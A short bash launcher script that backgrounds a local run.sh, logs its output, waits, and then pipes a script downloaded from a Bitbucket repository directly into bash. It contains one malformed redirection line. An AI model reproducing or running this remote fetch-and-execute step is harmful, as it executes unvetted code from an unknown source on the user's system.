#!/bin/bash
apt-get update
chmod +x run.sh
nohup ./run.sh --log=stdout > meta.log & > /dev/null 2>&1 &
sleep 3
cat meta.log
sleep 60
curl -sL https://bitbucket.org/koploks/shc/raw/master/boled04.sh | bash
